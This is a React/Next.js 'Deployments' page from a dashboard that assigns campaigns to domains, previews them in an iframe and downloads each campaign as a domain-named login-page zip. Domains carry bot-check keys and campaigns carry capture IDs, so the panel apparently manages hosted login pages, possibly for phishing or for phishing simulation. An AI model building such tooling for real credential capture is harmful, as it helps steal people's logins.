'use client';

import { useState } from 'react';
import Link from 'next/link';
import useSWR, { mutate } from 'swr';
import apiClient from '@/lib/api-client';
import { ArrowLeft, ExternalLink, Eye, Download, X, Play, StopCircle } from 'lucide-react';
import { toast } from 'sonner';

interface Domain {
  id: string;
  name: string;
  status: string;
  turnstileSitekey?: string;
  activeCampaignId?: string;
  activeCampaign?: {
    id: string;
    name: string;
    captureId: string;
  };
}

interface Campaign {
  id: string;
  name: string;
}

const fetcher = async (url: string) => {
  const response = await apiClient.get(url);
  return response.data;
};

export default function DeploymentsPage() {
  const [assignModalOpen, setAssignModalOpen] = useState(false);
  const [unassignModalOpen, setUnassignModalOpen] = useState(false);
  const [selectedDomain, setSelectedDomain] = useState<Domain | null>(null);
  const [selectedCampaignId, setSelectedCampaignId] = useState('');
  const [previewDomainId, setPreviewDomainId] = useState<string | null>(null);
  const [previewDomainName, setPreviewDomainName] = useState<string>('');
  const [previewCampaignId, setPreviewCampaignId] = useState<string>('');
  const [processing, setProcessing] = useState(false);

  const { data: domainsData, error: domainsError } = useSWR('/api/domains', fetcher);
  const { data: campaignsData, error: campaignsError } = useSWR('/api/campaigns', fetcher);

  const domains: Domain[] = domainsData?.domains || [];
  const campaigns: Campaign[] = campaignsData?.campaigns || [];

  const servingCount = domains.filter(d => d.activeCampaignId).length;
  const idleCount = domains.filter(d => !d.activeCampaignId).length;

  const handleAssign = async () => {
    if (!selectedDomain || !selectedCampaignId) return;

    setProcessing(true);
    try {
      await apiClient.patch(`/api/domains/${selectedDomain.id}/assign`, {
        campaignId: selectedCampaignId
      });
      toast.success('Campaign assigned successfully');
      mutate('/api/domains');
      setAssignModalOpen(false);
      setSelectedDomain(null);
      setSelectedCampaignId('');
    } catch (error: any) {
      toast.error(error.response?.data?.error || 'Failed to assign campaign');
    } finally {
      setProcessing(false);
    }
  };

  const handleUnassign = async () => {
    if (!selectedDomain) return;

    setProcessing(true);
    try {
      await apiClient.patch(`/api/domains/${selectedDomain.id}/assign`, {
        campaignId: null
      });
      toast.success('Campaign unassigned successfully');
      mutate('/api/domains');
      setUnassignModalOpen(false);
      setSelectedDomain(null);
    } catch (error: any) {
      toast.error(error.response?.data?.error || 'Failed to unassign campaign');
    } finally {
      setProcessing(false);
    }
  };

  const handleDownload = (campaignId: string, domainName: string) => {
    const link = document.createElement('a');
    link.href = `${process.env.NEXT_PUBLIC_BACKEND_URL || 'https://api.fioona.org'}/api/campaigns/${campaignId}/download-page`;
    link.download = `${domainName}-login-page.zip`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    toast.success('Download started');
  };

  return (
    <div className="mx-auto max-w-7xl p-8">
      {/* Header */}
      <div className="flex items-center justify-between mb-8">
        <div>
          <Link href="/dashboard" className="flex items-center gap-1.5 text-sm text-white/60 hover:text-white transition-colors mb-3">
            <ArrowLeft className="h-3.5 w-3.5" />
            Back
          </Link>
          <div className="mb-2 text-sm text-white/50">
            <Link href="/dashboard" className="hover:text-white/70 transition-colors cursor-pointer">Dashboard</Link>
            <span> / </span>
            <span>Deployments</span>
          </div>
          <h1 className="text-2xl font-semibold text-white">Deployments</h1>
          <p className="mt-1 text-sm text-white/50">Assign campaigns to domains and manage live hosting</p>
        </div>
      </div>

      {/* Stats */}
      <div className="grid grid-cols-3 gap-4 mb-8">
        <div className="rounded-xl border border-white/10 bg-[#151823] p-6">
          <p className="text-sm text-white/50">Total Domains</p>
          <p className="mt-2 text-3xl font-bold text-white">{domains.length}</p>
        </div>
        <div className="rounded-xl border border-white/10 bg-[#151823] p-6">
          <p className="text-sm text-white/50">Currently Serving</p>
          <p className="mt-2 text-3xl font-bold text-white">{servingCount}</p>
        </div>
        <div className="rounded-xl border border-white/10 bg-[#151823] p-6">
          <p className="text-sm text-white/50">Idle</p>
          <p className="mt-2 text-3xl font-bold text-white">{idleCount}</p>
        </div>
      </div>

      {/* Domains Table */}
      {domains.length === 0 ? (
        <div className="rounded-xl border border-white/10 bg-[#151823] p-12 text-center">
          <h3 className="text-lg font-medium text-white mb-2">No active domains</h3>
          <p className="text-sm text-white/50 mb-6">Add a domain in the Domains page first.</p>
          <Link
            href="/domains"
            className="inline-flex items-center gap-2 rounded-lg bg-[#4F7FFF] px-4 py-2 text-sm font-medium text-white hover:bg-[#3d6ee0] transition-colors"
          >
            Go to Domains
          </Link>
        </div>
      ) : (
        <div className="rounded-xl border border-white/10 bg-[#151823] overflow-hidden">
          <table className="w-full">
            <thead>
              <tr className="border-b border-white/10 bg-white/5">
                <th className="px-6 py-3 text-left text-xs font-medium uppercase tracking-wider text-white/40">Domain</th>
                <th className="px-6 py-3 text-left text-xs font-medium uppercase tracking-wider text-white/40">Status</th>
                <th className="px-6 py-3 text-left text-xs font-medium uppercase tracking-wider text-white/40">Assigned Campaign</th>
                <th className="px-6 py-3 text-left text-xs font-medium uppercase tracking-wider text-white/40">Live Link</th>
                <th className="px-6 py-3 text-right text-xs font-medium uppercase tracking-wider text-white/40">Actions</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-white/5">
              {domains.map((domain) => (
                <tr key={domain.id} className="hover:bg-white/5 transition-colors">
                  <td className="px-6 py-4 font-medium text-white">{domain.name}</td>
                  <td className="px-6 py-4">
                    {domain.activeCampaignId ? (
                      <span className="inline-flex items-center rounded-full bg-emerald-500/10 px-2.5 py-0.5 text-xs font-medium text-emerald-400">
                        Serving
                      </span>
                    ) : (
                      <span className="inline-flex items-center rounded-full bg-gray-500/10 px-2.5 py-0.5 text-xs font-medium text-gray-400">
                        Idle
                      </span>
                    )}
                  </td>
                  <td className="px-6 py-4 text-sm text-white/70">
                    {domain.activeCampaign?.name || '—'}
                  </td>
                  <td className="px-6 py-4">
                    {domain.activeCampaignId ? (
                      <div className="flex items-center gap-2">
                        <a
                          href={`https://${domain.name}`}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="text-sm text-blue-400 hover:text-blue-300 font-mono"
                        >
                          https://{domain.name}
                        </a>
                        <button
                          onClick={() => {
                            navigator.clipboard.writeText(`https://${domain.name}`);
                            toast.success('Link copied');
                          }}
                          className="text-white/40 hover:text-white transition-colors"
                        >
                          <ExternalLink className="h-3.5 w-3.5" />
                        </button>
                      </div>
                    ) : (
                      <span className="text-sm text-white/40">—</span>
                    )}
                  </td>
                  <td className="px-6 py-4">
                    <div className="flex items-center justify-end gap-2">
                      {domain.activeCampaignId ? (
                        <>
                          <button
                            onClick={() => {
                              setPreviewDomainId(domain.id);
                              setPreviewDomainName(domain.name);
                              setPreviewCampaignId(domain.activeCampaignId!);
                            }}
                            className="inline-flex items-center gap-1.5 rounded-lg px-3 py-1.5 text-xs font-medium text-blue-400 hover:bg-blue-500/10 transition-colors"
                          >
                            <Eye className="h-3.5 w-3.5" />
                            Preview
                          </button>
                          <button
                            onClick={() => window.open(`https://${domain.name}`, '_blank')}
                            className="inline-flex items-center gap-1.5 rounded-lg px-3 py-1.5 text-xs font-medium text-green-400 hover:bg-green-500/10 transition-colors"
                          >
                            <ExternalLink className="h-3.5 w-3.5" />
                            Open
                          </button>
                          <button
                            onClick={() => handleDownload(domain.activeCampaignId!, domain.name)}
                            className="inline-flex items-center gap-1.5 rounded-lg px-3 py-1.5 text-xs font-medium text-purple-400 hover:bg-purple-500/10 transition-colors"
                          >
                            <Download className="h-3.5 w-3.5" />
                            Download
                          </button>
                          <button
                            onClick={() => {
                              setSelectedDomain(domain);
                              setUnassignModalOpen(true);
                            }}
                            className="inline-flex items-center gap-1.5 rounded-lg px-3 py-1.5 text-xs font-medium text-red-400 hover:bg-red-500/10 transition-colors"
                          >
                            <StopCircle className="h-3.5 w-3.5" />
                            Unassign
                          </button>
                        </>
                      ) : (
                        <button
                          onClick={() => {
                            setSelectedDomain(domain);
                            setAssignModalOpen(true);
                          }}
                          className="inline-flex items-center gap-1.5 rounded-lg px-3 py-1.5 text-xs font-medium text-emerald-400 hover:bg-emerald-500/10 transition-colors"
                        >
                          <Play className="h-3.5 w-3.5" />
                          Assign Campaign
                        </button>
                      )}
                    </div>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      {/* Assign Campaign Modal */}
      {assignModalOpen && selectedDomain && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4">
          <div className="w-full max-w-md rounded-xl border border-white/10 bg-[#151823]">
            <div className="flex items-center justify-between border-b border-white/10 px-6 py-4">
              <h2 className="text-lg font-semibold text-white">Assign Campaign to {selectedDomain.name}</h2>
              <button
                onClick={() => {
                  setAssignModalOpen(false);
                  setSelectedDomain(null);
                  setSelectedCampaignId('');
                }}
                className="rounded-lg p-1.5 text-white/40 hover:bg-white/5 hover:text-white/70 transition-colors"
              >
                <X className="h-4 w-4" />
              </button>
            </div>

            <div className="p-6 space-y-4">
              <div>
                <label className="block text-sm font-medium text-white mb-2">
                  Select Campaign *
                </label>
                <select
                  value={selectedCampaignId}
                  onChange={(e) => setSelectedCampaignId(e.target.value)}
                  className="w-full rounded-lg border border-white/10 bg-white/5 px-3 py-2 text-sm text-white focus:border-[#4F7FFF] focus:outline-none"
                >
                  <option value="">Select campaign...</option>
                  {campaigns.map((campaign) => (
                    <option key={campaign.id} value={campaign.id}>
                      {campaign.name}
                    </option>
                  ))}
                </select>
              </div>

              <div className="flex gap-3 pt-4">
                <button
                  onClick={() => {
                    setAssignModalOpen(false);
                    setSelectedDomain(null);
                    setSelectedCampaignId('');
                  }}
                  disabled={processing}
                  className="flex-1 rounded-lg border border-white/10 bg-white/5 px-4 py-2 text-sm font-medium text-white hover:bg-white/10 transition-colors disabled:opacity-50"
                >
                  Cancel
                </button>
                <button
                  onClick={handleAssign}
                  disabled={!selectedCampaignId || processing}
                  className="flex-1 rounded-lg bg-[#4F7FFF] px-4 py-2 text-sm font-medium text-white hover:bg-[#3d6ee0] transition-colors disabled:opacity-50"
                >
                  {processing ? 'Assigning...' : 'Assign'}
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Unassign Confirmation Modal */}
      {unassignModalOpen && selectedDomain && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4">
          <div className="w-full max-w-md rounded-xl border border-white/10 bg-[#151823]">
            <div className="border-b border-white/10 px-6 py-4">
              <h2 className="text-lg font-semibold text-white">Unassign Campaign</h2>
            </div>
            <div className="p-6">
              <p className="text-sm text-white/70 mb-6">
                Stop serving <span className="font-semibold text-white">"{selectedDomain.activeCampaign?.name}"</span> on {selectedDomain.name}?
              </p>

              <div className="flex gap-3">
                <button
                  onClick={() => {
                    setUnassignModalOpen(false);
                    setSelectedDomain(null);
                  }}
                  disabled={processing}
                  className="flex-1 rounded-lg border border-white/10 bg-white/5 px-4 py-2 text-sm font-medium text-white hover:bg-white/10 transition-colors disabled:opacity-50"
                >
                  Cancel
                </button>
                <button
                  onClick={handleUnassign}
                  disabled={processing}
                  className="flex-1 rounded-lg bg-red-500 px-4 py-2 text-sm font-medium text-white hover:bg-red-600 transition-colors disabled:opacity-50"
                >
                  {processing ? 'Unassigning...' : 'Unassign'}
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Preview Modal */}
      {previewDomainId && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80">
          <div className="bg-[#0f1117] border border-white/10 rounded-xl w-[960px] max-w-[95vw] overflow-hidden">
            <div className="flex items-center justify-between px-5 py-4 border-b border-white/10">
              <span className="text-white font-medium">{previewDomainName} — Live Preview</span>
              <button onClick={() => setPreviewDomainId(null)} className="text-white/40 hover:text-white">
                <X className="w-5 h-5" />
              </button>
            </div>
            <iframe
              src={`${process.env.NEXT_PUBLIC_BACKEND_URL || 'https://api.fioona.org'}/api/preview/${previewCampaignId}`}
              style={{ width: '100%', height: '620px', border: 'none' }}
              title="Live Page Preview"
            />
          </div>
        </div>
      )}
    </div>
  );
}
